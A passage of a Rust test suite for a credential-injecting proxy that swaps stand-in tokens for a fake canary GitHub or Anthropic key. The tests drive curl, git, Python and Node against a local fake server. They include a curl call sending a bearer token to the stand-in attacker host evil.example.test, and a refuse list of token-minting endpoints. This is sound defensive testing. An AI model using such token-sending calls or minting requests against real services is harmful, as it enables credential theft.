//! The desk shell's proxy against a local fake upstream, driven by real curl, Python, git
//! and Node where this machine has them (each J test says when it skips),
//! and by a small Rust client for the rest. Every host goes to the fake
//! upstream, so no canary leaves the machine.

use std::convert::Infallible;
use std::net::SocketAddr;
use std::path::PathBuf;
use std::sync::{Arc, Mutex};
#[cfg(unix)]
use std::time::Duration;

use base64::Engine;
use base64::engine::general_purpose::STANDARD;
use bytes::Bytes;
use http::{Request, Response, StatusCode};
use http_body_util::combinators::BoxBody;
use http_body_util::{BodyExt, Full, StreamBody};
use hyper::body::{Frame, Incoming};
use hyper::service::service_fn;
use hyper_util::rt::TokioIo;
use rcgen::{
    BasicConstraints, CertificateParams, ExtendedKeyUsagePurpose, IsCa, Issuer, KeyPair,
    KeyUsagePurpose,
};
use tokio::io::{AsyncReadExt, AsyncWriteExt};
use tokio::net::TcpStream;
use tokio_rustls::rustls;
use tokio_rustls::rustls::RootCertStore;
use tokio_rustls::rustls::pki_types::{
    CertificateDer, PrivateKeyDer, PrivatePkcs8KeyDer, ServerName,
};

use super::{Binding, KeyProxy, StandIn, Use};

pub(crate) const REAL: &str = "ghp_REALcanaryW2proxy0000000000000000000";
pub(crate) const API: &str = "api.example.test";
const GIT: &str = "git.example.test";
const EVIL: &str = "evil.example.test";
const GITHUB: &str = "api.github.com";

#[derive(Clone, Debug)]
pub(crate) struct Seen {
    host: String,
    path: String,
    pub(crate) auth: String,
    other: String,
    api_key: String,
    body: String,
}

pub(crate) struct Upstream {
    pub(crate) addr: SocketAddr,
    pub(crate) ca_der: CertificateDer<'static>,
    pub(crate) ca_pem: String,
    seen: Arc<Mutex<Vec<Seen>>>,
}

impl Upstream {
    pub(crate) fn seen(&self) -> Vec<Seen> {
        self.seen.lock().unwrap().clone()
    }
}

/// HTTPS on loopback with a certificate for every test host, from its own
/// CA. It logs what it receives. `/echo` reflects the Authorization header;
/// `/leak` returns the real value in a header and, in small chunks, the
/// body; `/redirect` is a 302; `/gzip` answers encoded; `info/refs` asks
/// for Basic the way a git host does.
pub(crate) async fn upstream() -> Upstream {
    let ca_key = KeyPair::generate().unwrap();
    let mut ca_params = CertificateParams::new(Vec::<String>::new()).unwrap();
    ca_params.is_ca = IsCa::Ca(BasicConstraints::Unconstrained);
    ca_params.key_usages = vec![KeyUsagePurpose::KeyCertSign];
    let ca = ca_params.self_signed(&ca_key).unwrap();
    let issuer = Issuer::new(ca_params, ca_key);
    let key = KeyPair::generate().unwrap();
    let mut params =
        CertificateParams::new([API, GIT, EVIL, GITHUB].map(str::to_owned).to_vec()).unwrap();
    params.is_ca = IsCa::ExplicitNoCa;
    params.extended_key_usages = vec![ExtendedKeyUsagePurpose::ServerAuth];
    params.use_authority_key_identifier_extension = true;
    let leaf = params.signed_by(&key, &issuer).unwrap();
    let mut config = rustls::ServerConfig::builder_with_provider(Arc::new(
        rustls::crypto::aws_lc_rs::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_no_client_auth()
    .with_single_cert(
        vec![leaf.der().clone()],
        PrivateKeyDer::Pkcs8(PrivatePkcs8KeyDer::from(key.serialize_der())),
    )
    .unwrap();
    config.alpn_protocols = vec![b"http/1.1".to_vec()];
    let acceptor = tokio_rustls::TlsAcceptor::from(Arc::new(config));
    let listener = tokio::net::TcpListener::bind("127.0.0.1:0").await.unwrap();
    let addr = listener.local_addr().unwrap();
    let seen = Arc::new(Mutex::new(Vec::new()));
    let log = Arc::clone(&seen);
    tokio::spawn(async move {
        loop {
            let Ok((tcp, _)) = listener.accept().await else {
                continue;
            };
            let acceptor = acceptor.clone();
            let log = Arc::clone(&log);
            tokio::spawn(async move {
                let Ok(tls) = acceptor.accept(tcp).await else {
                    return;
                };
                let service = service_fn(move |request| answer(Arc::clone(&log), request));
                let _ = hyper::server::conn::http1::Builder::new()
                    .serve_connection(TokioIo::new(tls), service)
                    .await;
            });
        }
    });
    Upstream {
        addr,
        ca_pem: ca.pem(),
        ca_der: ca.der().clone(),
        seen,
    }
}

type TestBody = BoxBody<Bytes, Infallible>;

async fn answer(
    log: Arc<Mutex<Vec<Seen>>>,
    request: Request<Incoming>,
) -> Result<Response<TestBody>, Infallible> {
    let header = |name: &str| {
        request
            .headers()
            .get(name)
            .and_then(|v| v.to_str().ok())
            .unwrap_or_default()
            .to_owned()
    };
    let (host, auth, other) = (header("host"), header("authorization"), header("x-other"));
    let api_key = header("x-api-key");
    let path = request
        .uri()
        .path_and_query()
        .map(ToString::to_string)
        .unwrap_or_default();
    let body = request.into_body().collect().await.unwrap().to_bytes();
    log.lock().unwrap().push(Seen {
        host,
        path: path.clone(),
        auth: auth.clone(),
        other,
        api_key,
        body: String::from_utf8_lossy(&body).into_owned(),
    });
    let full = |text: String| Full::new(Bytes::from(text)).boxed();
    let response = if path.starts_with("/echo") {
        Response::new(full(format!("{{\"you_sent\":\"{auth}\"}}")))
    } else if path.contains("/info/refs") && auth.is_empty() {
        Response::builder()
            .status(401)
            .header("www-authenticate", "Basic realm=\"git\"")
            .body(full(String::new()))
            .unwrap()
    } else if path.starts_with("/redirect") {
        Response::builder()
            .status(302)
            .header("location", format!("https://{EVIL}/landed"))
            .body(full(String::new()))
            .unwrap()
    } else if path.starts_with("/leak") {
        let text = format!("the key is {REAL}; again {REAL}.");
        let chunks: Vec<Result<Frame<Bytes>, Infallible>> = text
            .as_bytes()
            .chunks(5)
            .map(|c| Ok(Frame::data(Bytes::copy_from_slice(c))))
            .collect();
        Response::builder()
            .header("x-key", REAL)
            .header("content-length", text.len().to_string())
            .body(StreamBody::new(futures_util::stream::iter(chunks)).boxed())
            .unwrap()
    } else if path.starts_with("/gzip") {
        Response::builder()
            .header("content-encoding", "gzip")
            .body(full("not really gzip".to_owned()))
            .unwrap()
    } else {
        Response::new(full("{\"ok\":true}".to_owned()))
    };
    Ok(response)
}

pub(crate) fn github_token(origins: &[&str]) -> Binding {
    Binding {
        name: "GH_TOKEN".to_owned(),
        value: REAL.to_owned(),
        use_: Use {
            origins: origins.iter().map(|h| format!("https://{h}")).collect(),
            header: "Authorization".to_owned(),
            schemes: vec!["Bearer".into(), "token".into(), "Basic".into()],
            stand_in: Some(StandIn {
                prefix: "ghp_".to_owned(),
                length: 40,
            }),
            refuse: None,
        },
    }
}

struct Rig {
    proxy: KeyProxy,
    addr: SocketAddr,
    up: Upstream,
    /// Holds the bundle (`bundle`); a program a test runs starts in it.
    dir: tempfile::TempDir,
    /// The run's proxy user and password, and its stand-in.
    user: String,
    password: String,
    stand_in: String,
}

async fn rig_with(roots: Option<RootCertStore>, binding: Binding) -> Rig {
    let up = upstream().await;
    let roots = roots.unwrap_or_else(|| {
        let mut roots = RootCertStore::empty();
        roots.add(up.ca_der.clone()).unwrap();
        roots
    });
    let proxy = KeyProxy::for_test(roots, up.addr);
    proxy.deliver("ada", vec![binding]).unwrap();
    let access = proxy.begin("ada");
    let stand_in = access.stand_ins[0].1.clone();
    let listener = std::net::TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    tokio::spawn(proxy.clone().serve(listener));
    let dir = tempfile::tempdir().unwrap();
    let bundle = dir.path().join("ca-bundle.pem");
    std::fs::write(&bundle, format!("{}{}", up.ca_pem, proxy.ca_pem())).unwrap();
    Rig {
        proxy,
        addr,
        up,
        dir,
        user: access.user,
        password: access.password,
        stand_in,
    }
}

impl Rig {
    /// The proxy's CA and the fake upstream's, the way a run's bundle is the
    /// system roots and the proxy's.
    fn bundle(&self) -> PathBuf {
        self.dir.path().join("ca-bundle.pem")
    }
}

async fn rig() -> Rig {
    rig_with(None, github_token(&[API, GIT])).await
}

/// A program run the way a job runs it, or `None` if it is not installed.
#[cfg(unix)]
async fn run(rig: &Rig, program: &str, args: &[&str]) -> Option<String> {
    let proxy = format!("http://{}:{}@{}", rig.user, rig.password, rig.addr);
    let bundle = rig.bundle();
    let bundle = bundle.to_str().unwrap();
    let mut command = tokio::process::Command::new(program);
    command
        .args(args)
        .current_dir(rig.dir.path())
        .env("HTTPS_PROXY", &proxy)
        .env("https_proxy", &proxy)
        .env("NODE_USE_ENV_PROXY", "1")
        .env("SSL_CERT_FILE", bundle)
        .env("CURL_CA_BUNDLE", bundle)
        .env("GIT_SSL_CAINFO", bundle)
        .env("REQUESTS_CA_BUNDLE", bundle)
        .env("NODE_EXTRA_CA_CERTS", bundle)
        .env("GH_TOKEN", &rig.stand_in)
        .env("GIT_CONFIG_NOSYSTEM", "1")
        .env("GIT_CONFIG_GLOBAL", "/dev/null")
        .env("GIT_TERMINAL_PROMPT", "0")
        .env("PYTHONNOUSERSITE", "1");
    for name in [
        "HTTP_PROXY",
        "http_proxy",
        "ALL_PROXY",
        "all_proxy",
        "NO_PROXY",
        "no_proxy",
    ] {
        command.env_remove(name);
    }
    command.kill_on_drop(true);
    let output = match tokio::time::timeout(Duration::from_secs(90), command.output()).await {
        Ok(Ok(output)) => output,
        Ok(Err(error)) if error.kind() == std::io::ErrorKind::NotFound => {
            eprintln!("skipped: no {program} on this machine");
            return None;
        }
        Ok(Err(error)) => panic!("{program}: {error}"),
        Err(tokio::time::error::Elapsed { .. }) => panic!("{program} timed out"),
    };
    let text = format!(
        "{}{}",
        String::from_utf8_lossy(&output.stdout),
        String::from_utf8_lossy(&output.stderr)
    );
    assert!(!text.contains(REAL), "{program} saw the value: {text}");
    Some(text)
}

fn only(seen: Vec<Seen>) -> Seen {
    assert_eq!(seen.len(), 1, "{seen:?}");
    seen.into_iter().next().unwrap()
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j1_curl_bearer_reaches_the_service_with_the_value() {
    let rig = rig().await;
    let auth = format!("Authorization: Bearer {}", rig.stand_in);
    let Some(out) = run(
        &rig,
        "curl",
        &["-sS", &format!("https://{API}/user"), "-H", &auth],
    )
    .await
    else {
        return;
    };
    assert!(out.contains("\"ok\":true"), "{out}");
    let seen = only(rig.up.seen());
    assert_eq!(seen.auth, format!("Bearer {REAL}"));
    assert_eq!(seen.host, API);
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j2_python_token_scheme_under_strict_verification() {
    let rig = rig().await;
    let script = format!(
        "import os, ssl, urllib.request as u\n\
         c = ssl.create_default_context(cafile=os.environ['SSL_CERT_FILE'])\n\
         c.verify_flags |= ssl.VERIFY_X509_STRICT\n\
         r = u.Request('https://{API}/repos', headers={{'Authorization': 'token ' + os.environ['GH_TOKEN']}})\n\
         print(u.urlopen(r, context=c).read().decode())\n"
    );
    let Some(out) = run(&rig, "python3", &["-I", "-c", &script]).await else {
        return;
    };
    assert!(out.contains("\"ok\":true"), "{out}");
    assert_eq!(only(rig.up.seen()).auth, format!("token {REAL}"));
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j3_git_basic_through_a_credential_helper() {
    let rig = rig().await;
    let helper =
        "credential.helper=!f(){ echo username=x-access-token; echo password=$GH_TOKEN; }; f";
    let Some(_) = run(
        &rig,
        "git",
        &["-c", helper, "ls-remote", &format!("https://{GIT}/o/r.git")],
    )
    .await
    else {
        return;
    };
    let seen = rig.up.seen();
    let want = format!(
        "Basic {}",
        STANDARD.encode(format!("x-access-token:{REAL}"))
    );
    assert!(seen.iter().any(|s| s.auth == want), "{seen:?}");
    assert!(seen.iter().all(|s| s.host == GIT), "{seen:?}");
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j4_a_reflecting_endpoint_gives_back_the_stand_in() {
    let rig = rig().await;
    let auth = format!("Authorization: Bearer {}", rig.stand_in);
    let Some(out) = run(
        &rig,
        "curl",
        &["-sS", &format!("https://{API}/echo"), "-H", &auth],
    )
    .await
    else {
        return;
    };
    assert!(out.contains(&format!("Bearer {}", rig.stand_in)), "{out}");
    assert_eq!(only(rig.up.seen()).auth, format!("Bearer {REAL}"));
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j5_a_stand_in_in_a_body_stays_a_stand_in() {
    let rig = rig().await;
    let auth = format!("Authorization: Bearer {}", rig.stand_in);
    let data = format!("content={}", rig.stand_in);
    let url = format!("https://{API}/gists");
    let Some(_) = run(&rig, "curl", &["-sS", &url, "-H", &auth, "-d", &data]).await else {
        return;
    };
    let seen = only(rig.up.seen());
    assert_eq!(seen.body, data);
    assert_eq!(seen.auth, format!("Bearer {REAL}"));
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j6_an_unbound_host_sees_only_the_stand_in() {
    let rig = rig().await;
    let auth = format!("Authorization: Bearer {}", rig.stand_in);
    let url = format!("https://{EVIL}/x");
    let Some(out) = run(&rig, "curl", &["-sS", &url, "-H", &auth]).await else {
        return;
    };
    assert!(out.contains("\"ok\":true"), "{out}");
    let seen = only(rig.up.seen());
    assert_eq!(seen.auth, format!("Bearer {}", rig.stand_in));
    assert_eq!(seen.host, EVIL);
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn j7_node_fetch_through_the_env_proxy() {
    let rig = rig().await;
    let script = format!(
        "fetch('https://{API}/node',{{headers:{{authorization:'Bearer '+process.env.GH_TOKEN}}}})\
         .then(r=>r.text()).then(console.log,e=>{{console.log('ERR',e.cause||e);process.exit(1)}})"
    );
    let Some(out) = run(&rig, "node", &["-e", &script]).await else {
        return;
    };
    assert!(out.contains("\"ok\":true"), "{out}");
    assert_eq!(only(rig.up.seen()).auth, format!("Bearer {REAL}"));
}

#[cfg(unix)]
#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn revoking_stops_a_running_curl_loop() {
    let rig = rig().await;
    let stop = rig.dir.path().join("stop");
    let script = format!(
        "while [ ! -e '{}' ]; do curl -sS -o /dev/null https://{API}/loop -H \"Authorization: Bearer $GH_TOKEN\"; sleep 0.05; done",
        stop.display()
    );
    let looping = {
        let script = script.clone();
        let rig = &rig;
        async move { run(rig, "sh", &["-c", &script]).await }
    };
    let watch = async {
        if !wait_for(|| rig.up.seen().len() >= 3).await {
            std::fs::write(&stop, "").unwrap();
            return None;
        }
        rig.proxy.deliver("ada", Vec::new()).unwrap();
        let at = rig.up.seen().len();
        let more = wait_for(|| rig.up.seen().len() >= at + 4).await;
        std::fs::write(&stop, "").unwrap();
        Some((at, more))
    };
    let (ran, watched) = tokio::join!(looping, watch);
    if ran.is_none() || which("curl").is_none() {
        eprintln!("skipped: no sh or curl on this machine");
        return;
    }
    let (at, more) = watched.expect("the loop reached the upstream");
    assert!(more, "the loop kept running after the revoke");
    let seen = rig.up.seen();
    assert!(seen[..3].iter().all(|s| s.auth == format!("Bearer {REAL}")));
    // One request may have been on its way when the delivery landed.
    for s in &seen[at + 1..] {
        assert_eq!(s.auth, format!("Bearer {}", rig.stand_in), "{seen:?}");
    }
}

#[cfg(unix)]
async fn wait_for(mut done: impl FnMut() -> bool) -> bool {
    for _ in 0..200 {
        if done() {
            return true;
        }
        tokio::time::sleep(Duration::from_millis(50)).await;
    }
    false
}

#[cfg(unix)]
fn which(program: &str) -> Option<PathBuf> {
    std::env::var_os("PATH").and_then(|path| {
        std::env::split_paths(&path)
            .map(|dir| dir.join(program))
            .find(|p| p.is_file())
    })
}

/// A connection through the proxy to `host` as the rig's run, the way a
/// client opens one.
async fn connect(rig: &Rig, host: &str) -> hyper::client::conn::http1::SendRequest<Full<Bytes>> {
    connect_as(rig, host, &rig.user, &rig.password).await
}

/// The CONNECT's answer head, as `user`.
async fn open_tunnel(rig: &Rig, host: &str, user: &str, password: &str) -> (TcpStream, String) {
    let mut tcp = TcpStream::connect(rig.addr).await.unwrap();
    let credential = STANDARD.encode(format!("{user}:{password}"));
    tcp.write_all(
        format!("CONNECT {host}:443 HTTP/1.1\r\nHost: {host}:443\r\nProxy-Authorization: Basic {credential}\r\n\r\n")
            .as_bytes(),
    )
    .await
    .unwrap();
    let mut head = Vec::new();
    while !head.ends_with(b"\r\n\r\n") {
        let mut byte = [0u8];
        tcp.read_exact(&mut byte).await.unwrap();
        head.push(byte[0]);
    }
    (tcp, String::from_utf8_lossy(&head).into_owned())
}

/// A connection through the proxy to `host` as the run `user` is.
async fn connect_as(
    rig: &Rig,
    host: &str,
    user: &str,
    password: &str,
) -> hyper::client::conn::http1::SendRequest<Full<Bytes>> {
    let (tcp, head) = open_tunnel(rig, host, user, password).await;
    assert!(head.starts_with("HTTP/1.1 200"), "{head}");
    let mut roots = RootCertStore::empty();
    for cert in rustls_pemfile(&std::fs::read_to_string(rig.bundle()).unwrap()) {
        roots.add(cert).unwrap();
    }
    let config = rustls::ClientConfig::builder_with_provider(Arc::new(
        rustls::crypto::aws_lc_rs::default_provider(),
    ))
    .with_safe_default_protocol_versions()
    .unwrap()
    .with_root_certificates(roots)
    .with_no_client_auth();
    let tls = tokio_rustls::TlsConnector::from(Arc::new(config))
        .connect(ServerName::try_from(host.to_owned()).unwrap(), tcp)
        .await
        .unwrap();
    let (sender, connection) = hyper::client::conn::http1::handshake(TokioIo::new(tls))
        .await
        .unwrap();
    tokio::spawn(connection);
    sender
}

fn rustls_pemfile(text: &str) -> Vec<CertificateDer<'static>> {
    text.split("-----BEGIN CERTIFICATE-----")
        .skip(1)
        .map(|block| {
            let body: String = block
                .split("-----END CERTIFICATE-----")
                .next()
                .unwrap()
                .split_whitespace()
                .collect();
            CertificateDer::from(STANDARD.decode(body).unwrap())
        })
        .collect()
}

async fn send(
    sender: &mut hyper::client::conn::http1::SendRequest<Full<Bytes>>,
    host: &str,
    method: &str,
    path: &str,
    headers: &[(&str, String)],
) -> (StatusCode, http::HeaderMap, String) {
    let mut request = Request::builder()
        .method(method)
        .uri(path)
        .header("host", host);
    for (name, value) in headers {
        request = request.header(*name, value);
    }
    sender.ready().await.unwrap();
    let response = sender
        .send_request(request.body(Full::new(Bytes::new())).unwrap())
        .await
        .unwrap();
    let status = response.status();
    let headers = response.headers().clone();
    let body = response.into_body().collect().await.unwrap().to_bytes();
    let body = String::from_utf8_lossy(&body).into_owned();
    (status, headers, body)
}

fn bearer(stand_in: &str) -> (&'static str, String) {
    ("authorization", format!("Bearer {stand_in}"))
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn revoking_stops_injection_on_an_open_connection() {
    let rig = rig().await;
    let mut c = connect(&rig, API).await;
    send(&mut c, API, "GET", "/a", &[bearer(&rig.stand_in)]).await;
    rig.proxy.deliver("ada", Vec::new()).unwrap();
    send(&mut c, API, "GET", "/b", &[bearer(&rig.stand_in)]).await;
    let seen = rig.up.seen();
    assert_eq!(seen[0].auth, format!("Bearer {REAL}"));
    assert_eq!(seen[1].auth, format!("Bearer {}", rig.stand_in));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_stand_in_from_a_finished_run_is_dead() {
    let rig = rig().await;
    let next = rig.proxy.begin("ada");
    rig.proxy.end(&rig.user);
    // The finished run's user lets nothing through at all.
    let (_, head) = open_tunnel(&rig, API, &rig.user, &rig.password).await;
    assert!(head.starts_with("HTTP/1.1 407"), "{head}");
    // A run still going sends its own stand-in, never the finished one's.
    let mut c = connect_as(&rig, API, &next.user, &next.password).await;
    send(&mut c, API, "GET", "/dead", &[bearer(&rig.stand_in)]).await;
    send(
        &mut c,
        API,
        "GET",
        "/alive",
        &[bearer(&next.stand_ins[0].1)],
    )
    .await;
    let seen = rig.up.seen();
    assert_eq!(seen[0].auth, format!("Bearer {}", rig.stand_in));
    assert_eq!(seen[1].auth, format!("Bearer {REAL}"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn another_teammates_desk_run_cannot_use_this_stand_in() {
    let rig = rig().await;
    // Bob holds a key of the same name: his runs have stand-ins of their own.
    rig.proxy
        .deliver("bob", vec![github_token(&[API])])
        .unwrap();
    let bob = rig.proxy.begin("bob");
    let mut c = connect_as(&rig, API, &bob.user, &bob.password).await;
    send(&mut c, API, "GET", "/ada", &[bearer(&rig.stand_in)]).await;
    // A run of Ada's own is no different: a stand-in is its run's alone.
    let other = rig.proxy.begin("ada");
    let mut d = connect_as(&rig, API, &other.user, &other.password).await;
    send(&mut d, API, "GET", "/ada-again", &[bearer(&rig.stand_in)]).await;
    let seen = rig.up.seen();
    assert_eq!(seen.len(), 2);
    for request in &seen {
        assert_eq!(request.auth, format!("Bearer {}", rig.stand_in), "{seen:?}");
    }
    // Bob's own key is still his.
    send(&mut c, API, "GET", "/bob", &[bearer(&bob.stand_ins[0].1)]).await;
    assert_eq!(rig.up.seen()[2].auth, format!("Bearer {REAL}"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_connection_without_a_runs_credential_is_refused() {
    let rig = rig().await;
    for (user, password) in [("", ""), (rig.user.as_str(), "wrong"), ("hl-nobody", "x")] {
        let (_, head) = open_tunnel(&rig, API, user, password).await;
        assert!(head.starts_with("HTTP/1.1 407"), "{head}");
    }
    let mut tcp = TcpStream::connect(rig.addr).await.unwrap();
    tcp.write_all(format!("CONNECT {EVIL}:443 HTTP/1.1\r\nHost: {EVIL}:443\r\n\r\n").as_bytes())
        .await
        .unwrap();
    let mut reply = String::new();
    tcp.read_to_string(&mut reply).await.unwrap();
    assert!(reply.starts_with("HTTP/1.1 407"), "{reply}");
    assert!(rig.up.seen().is_empty());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_regrant_does_not_revive_an_old_stand_in() {
    let rig = rig().await;
    rig.proxy.deliver("ada", Vec::new()).unwrap();
    rig.proxy
        .deliver("ada", vec![github_token(&[API])])
        .unwrap();
    let fresh = rig.proxy.begin("ada");
    assert_ne!(fresh.stand_ins[0].1, rig.stand_in);
    let mut c = connect(&rig, API).await;
    send(&mut c, API, "GET", "/old", &[bearer(&rig.stand_in)]).await;
    let mut d = connect_as(&rig, API, &fresh.user, &fresh.password).await;
    send(&mut d, API, "GET", "/new", &[bearer(&fresh.stand_ins[0].1)]).await;
    let seen = rig.up.seen();
    assert_eq!(seen[0].auth, format!("Bearer {}", rig.stand_in));
    assert_eq!(seen[1].auth, format!("Bearer {REAL}"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn each_run_gets_its_own_stand_in_in_the_service_shape() {
    let rig = rig().await;
    let other = rig.proxy.begin("ada").stand_ins.remove(0).1;
    assert_ne!(other, rig.stand_in);
    assert_ne!(rig.proxy.begin("ada").user, rig.user);
    for s in [&rig.stand_in, &other] {
        assert_eq!(s.len(), 40);
        assert!(s.starts_with("ghp_"));
        assert!(s[4..].bytes().all(|b| b.is_ascii_alphanumeric()));
    }
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_key_minting_request_is_refused() {
    let rig = rig_with(None, github_token(&[GITHUB])).await;
    let mut c = connect(&rig, GITHUB).await;
    for path in [
        "/authorizations",
        "/app/installations/9/access_tokens",
        "/%61uthorizations",
    ] {
        let (status, _, _) = send(&mut c, GITHUB, "POST", path, &[bearer(&rig.stand_in)]).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{path}");
    }
    assert!(rig.up.seen().is_empty(), "{:?}", rig.up.seen());
    // Without the key the request is the job's own business.
    send(
        &mut c,
        GITHUB,
        "POST",
        "/authorizations",
        &[bearer("its-own")],
    )
    .await;
    let (status, _, _) = send(&mut c, GITHUB, "GET", "/user", &[bearer(&rig.stand_in)]).await;
    assert_eq!(status, StatusCode::OK);
    let seen = rig.up.seen();
    assert_eq!(seen[0].auth, "Bearer its-own");
    assert_eq!(seen[1].auth, format!("Bearer {REAL}"));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_desks_refuse_list_adds_to_the_built_in_one() {
    let mut binding = github_token(&[GITHUB]);
    binding.use_.refuse = Some(vec!["/custom/*/mint".to_owned()]);
    let rig = rig_with(None, binding).await;
    let mut c = connect(&rig, GITHUB).await;
    for path in ["/custom/7/mint", "/authorizations"] {
        let (status, _, _) = send(&mut c, GITHUB, "POST", path, &[bearer(&rig.stand_in)]).await;
        assert_eq!(status, StatusCode::FORBIDDEN, "{path}");
    }
    assert!(rig.up.seen().is_empty());
    // An empty list, or none, still refuses the built-in minimum, and
    // passes an ordinary request.
    for refuse in [Some(Vec::new()), None] {
        let mut binding = github_token(&[GITHUB]);
        binding.use_.refuse = refuse;
        rig.proxy.deliver("ada", vec![binding]).unwrap();
        let fresh = rig.proxy.begin("ada");
        let mut c = connect_as(&rig, GITHUB, &fresh.user, &fresh.password).await;
        let (status, _, _) = send(
            &mut c,
            GITHUB,
            "POST",
            "/authorizations",
            &[bearer(&fresh.stand_ins[0].1)],
        )
        .await;
        assert_eq!(status, StatusCode::FORBIDDEN);
        let mut c = connect_as(&rig, GITHUB, &fresh.user, &fresh.password).await;
        let (status, _, _) = send(
            &mut c,
            GITHUB,
            "GET",
            "/user",
            &[bearer(&fresh.stand_ins[0].1)],
        )
        .await;
        assert_eq!(status, StatusCode::OK);
    }
    assert_eq!(rig.up.seen().len(), 2);
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_scheme_free_header_carries_the_whole_key() {
    // Anthropic's shape: `x-api-key: <key>`, no scheme.
    let mut binding = github_token(&[API]);
    binding.use_.header = "x-api-key".to_owned();
    binding.use_.schemes = Vec::new();
    binding.use_.stand_in = Some(StandIn {
        prefix: "sk-ant-api03-".to_owned(),
        length: 60,
    });
    let rig = rig_with(None, binding).await;
    assert!(rig.stand_in.starts_with("sk-ant-api03-"));
    let mut c = connect(&rig, API).await;
    send(
        &mut c,
        API,
        "POST",
        "/v1/messages",
        &[("x-api-key", rig.stand_in.clone())],
    )
    .await;
    send(
        &mut c,
        API,
        "POST",
        "/v1/messages",
        &[("x-api-key", format!("Bearer {}", rig.stand_in))],
    )
    .await;
    send(
        &mut c,
        API,
        "POST",
        "/v1/messages",
        &[bearer(&rig.stand_in)],
    )
    .await;
    let seen = rig.up.seen();
    assert_eq!(seen[0].api_key, REAL);
    assert_eq!(seen[1].api_key, format!("Bearer {}", rig.stand_in));
    assert_eq!(
        seen[2].auth,
        format!("Bearer {}", rig.stand_in),
        "not its header"
    );
    let (_, _, body) = send(
        &mut c,
        API,
        "GET",
        "/leak",
        &[("x-api-key", rig.stand_in.clone())],
    )
    .await;
    assert!(
        !body.contains(REAL) && body.contains(&rig.stand_in),
        "{body}"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_value_goes_only_in_its_header_and_schemes() {
    let rig = rig().await;
    let s = &rig.stand_in;
    let mut c = connect(&rig, API).await;
    send(
        &mut c,
        API,
        "GET",
        &format!("/q?key={s}"),
        &[("x-other", s.clone())],
    )
    .await;
    send(
        &mut c,
        API,
        "GET",
        "/digest",
        &[("authorization", format!("Digest {s}"))],
    )
    .await;
    send(&mut c, API, "GET", "/suffix", &[bearer(&format!("{s}x"))]).await;
    send(&mut c, API, "GET", "/bare", &[("authorization", s.clone())]).await;
    for seen in rig.up.seen() {
        assert!(seen.body.is_empty(), "{seen:?}");
        assert!(!seen.auth.contains(REAL), "{seen:?}");
        assert!(!seen.other.contains(REAL), "{seen:?}");
        assert!(!seen.path.contains(REAL), "{seen:?}");
    }
    assert!(rig.up.seen()[0].path.contains(s.as_str()));
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_redirect_is_handed_back_not_followed() {
    let rig = rig().await;
    let mut c = connect(&rig, API).await;
    let (status, headers, _) =
        send(&mut c, API, "GET", "/redirect", &[bearer(&rig.stand_in)]).await;
    assert_eq!(status, StatusCode::FOUND);
    assert_eq!(headers["location"], format!("https://{EVIL}/landed"));
    let seen = only(rig.up.seen());
    assert_eq!(seen.path, "/redirect");
    assert_eq!(
        seen.host, API,
        "the service is asked as the CONNECT named it"
    );
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn the_value_is_scrubbed_from_a_reply() {
    let rig = rig().await;
    let mut c = connect(&rig, API).await;
    // Sent with the key, and without it: the reply never carries the value.
    for auth in [bearer(&rig.stand_in), bearer("nothing")] {
        let (status, headers, body) = send(&mut c, API, "GET", "/leak", &[auth]).await;
        assert_eq!(status, StatusCode::OK);
        let header = headers["x-key"].to_str().unwrap();
        assert!(
            !body.contains(REAL) && !header.contains(REAL),
            "{header} {body}"
        );
    }
    let (_, headers, body) = send(&mut c, API, "GET", "/leak", &[bearer(&rig.stand_in)]).await;
    assert_eq!(
        body,
        format!("the key is {0}; again {0}.", rig.stand_in),
        "the job's own stand-in comes back"
    );
    assert_eq!(headers["x-key"], rig.stand_in.as_str());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_upstream_the_roots_do_not_vouch_for_gets_nothing() {
    let rig = rig_with(Some(RootCertStore::empty()), github_token(&[API])).await;
    let mut c = connect(&rig, API).await;
    let (status, _, body) = send(&mut c, API, "GET", "/user", &[bearer(&rig.stand_in)]).await;
    assert_eq!(status, StatusCode::BAD_GATEWAY, "{body}");
    assert!(rig.up.seen().is_empty());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn a_request_naming_another_host_is_refused() {
    let rig = rig().await;
    let mut c = connect(&rig, API).await;
    let (status, _, _) = send(&mut c, EVIL, "GET", "/user", &[bearer(&rig.stand_in)]).await;
    assert_eq!(status, StatusCode::BAD_REQUEST);
    assert!(rig.up.seen().is_empty());
}

#[tokio::test(flavor = "multi_thread", worker_threads = 2)]
async fn an_encoded_reply_to_a_keyed_request_is_refused() {
    let rig = rig().await;
    let mut c = connect(&rig, API).await;
    let (status, _, _) = send(&mut c, API, "GET", "/gzip", &[bearer(&rig.stand_in)]).await;
    assert_eq!(status, StatusCode::BAD_GATEWAY);
    let (status, _, _) = send(&mut c, API, "GET", "/gzip", &[]).await;
